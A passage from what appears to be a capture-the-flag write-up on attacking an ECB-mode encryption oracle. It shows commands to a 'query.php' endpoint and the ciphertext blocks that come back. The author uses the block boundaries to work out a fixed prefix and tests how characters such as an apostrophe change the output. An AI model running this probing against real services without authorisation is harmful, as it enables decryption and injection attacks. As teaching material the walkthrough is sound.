12 : AAAAAAAAAAAA : 80 bytes: G+glEae6W/1XjA7vRm21nA==  3IRyj9z4nZN1HRCnx1yM8g==  XyKnJ/YlQZpGb5r1OJH5sg==  h1J9Q3czmMbvHxFKUToAKA==  df1QRP0GPSb2u39zS0HImQ==
13 : AAAAAAAAAAAAA : 96 bytes: G+glEae6W/1XjA7vRm21nA==  3IRyj9z4nZN1HRCnx1yM8g==  XyKnJ/YlQZpGb5r1OJH5sg==  xkduQZYZ04f0V3MSJfFf4Q==  YiOhTZxCkbmHdbA/vHPU7Q==  2K5R19pxsrCD2Rmg17iLmA==
```

At 13 characters, an extra ciphertext block appears.

This shows the input fills only ~12 bytes of the first 16-byte block before overflowing into the next block, meaning a fixed prefix is already occupying part of that block.
This behavior is consistent with a 16-byte block cipher in ECB mode.

Let's try different characters at the end (12th character) (including punctuation):
```powershell
php query.php "AAAAAAAAAAAB" | php decode.php
php query.php "AAAAAAAAAAAc" | php decode.php
php query.php "AAAAAAAAAAA!" | php decode.php
php query.php "AAAAAAAAAAA'" | php decode.php
```

Output:
```txt
80 bytes: G+glEae6W/1XjA7vRm21nA==  3IRyj9z4nZN1HRCnx1yM8g==  XyKnJ/YlQZpGb5r1OJH5sg==  T0d9WGqFhNi7IDZHOVRzVw==  df1QRP0GPSb2u39zS0HImQ==
80 bytes: G+glEae6W/1XjA7vRm21nA==  3IRyj9z4nZN1HRCnx1yM8g==  XyKnJ/YlQZpGb5r1OJH5sg==  3oT10ThdEDueyRxN8Ed/KQ==  df1QRP0GPSb2u39zS0HImQ==
80 bytes: G+glEae6W/1XjA7vRm21nA==  3IRyj9z4nZN1HRCnx1yM8g==  XyKnJ/YlQZpGb5r1OJH5sg==  g68AP4uzVKIYIhZ9OOygjg==  df1QRP0GPSb2u39zS0HImQ==
96 bytes: G+glEae6W/1XjA7vRm21nA==  3IRyj9z4nZN1HRCnx1yM8g==  XyKnJ/YlQZpGb5r1OJH5sg==  Zn735bld6KgLc8sEaILMog==  YiOhTZxCkbmHdbA/vHPU7Q==  2K5R19pxsrCD2Rmg17iLmA==
```

